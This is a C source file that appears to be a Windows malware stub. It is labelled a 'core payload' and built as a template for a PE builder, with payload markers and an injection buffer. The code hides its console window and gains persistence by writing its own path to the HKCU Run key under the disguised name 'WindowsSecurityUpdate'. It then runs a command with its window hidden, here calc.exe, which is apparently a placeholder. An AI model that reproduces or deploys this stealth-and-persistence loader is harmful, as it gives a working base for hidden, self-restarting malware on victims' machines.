#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// ===============================================================================
// CORE PAYLOAD - C VERSION FOR MINGW COMPATIBILITY
// Simple, reliable, cross-platform compatible
// ===============================================================================

// Core configuration
static int stealth_mode = 1;
static int persistence_mode = 1;
static int payload_encrypted = 0;

// Payload markers for PE builder
const char payload_marker_start[] = "PAYLOAD_START_MARKER_DEADBEEF";
const char payload_marker_end[] = "PAYLOAD_END_MARKER_CAFEBABE";

// Injection point for PE builder
unsigned char injection_point[1024] = {0};

// ===============================================================================
// CORE INITIALIZATION
// ===============================================================================
void core_init() {
    if (payload_encrypted) {
        // Decrypt payload if needed (implemented by PE builder)
        // decrypt_embedded_payload();
    }
}

// ===============================================================================
// STEALTH FUNCTIONS
// ===============================================================================
void stealth_init() {
    if (stealth_mode) {
        // Hide console window
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
}

void stealth_cleanup() {
    if (stealth_mode) {
        Sleep(2000); // Wait 2 seconds before exit
    }
}

// ===============================================================================
// PAYLOAD EXECUTION
// ===============================================================================
void execute_payload() {
    const char* cmd = "calc.exe";
    
    if (stealth_mode) {
        // Execute hidden
        ShellExecuteA(NULL, NULL, cmd, NULL, NULL, SW_HIDE);
    } else {
        // Execute normally
        ShellExecuteA(NULL, NULL, cmd, NULL, NULL, SW_SHOWNORMAL);
    }
}

// ===============================================================================
// PERSISTENCE (OPTIONAL)
// ===============================================================================
void install_persistence() {
    if (persistence_mode) {
        // Basic registry persistence
        HKEY hKey;
        const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        const char* name = "WindowsSecurityUpdate";
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, name, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hKey);
        }
    }
}

// ===============================================================================
// MAIN ENTRY POINT
// ===============================================================================
int main() {
    // Core initialization
    core_init();
    
    // Stealth setup
    stealth_init();
    
    // Install persistence
    install_persistence();
    
    // Execute payload
    execute_payload();
    
    // Cleanup
    stealth_cleanup();
    
    return 0;
}